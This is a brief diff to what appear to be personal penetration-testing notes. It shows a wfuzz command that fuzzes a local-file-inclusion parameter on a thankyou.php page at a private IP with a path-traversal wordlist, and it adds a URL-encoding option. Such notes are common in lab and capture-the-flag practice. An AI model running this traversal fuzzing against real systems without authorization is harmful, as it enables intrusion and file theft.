@@ -1,4 +1,6 @@
 #lfi
 wfuzz -w /usr/share/wordlists/wfuzz/general/common.txt -w Traversal_Huge.txt  -u 'http://192.168.130.178/thankyou.php?FUZZ=FUZ2Z'
 
+#encoder 
+-z file,query.txt,urlencode
 
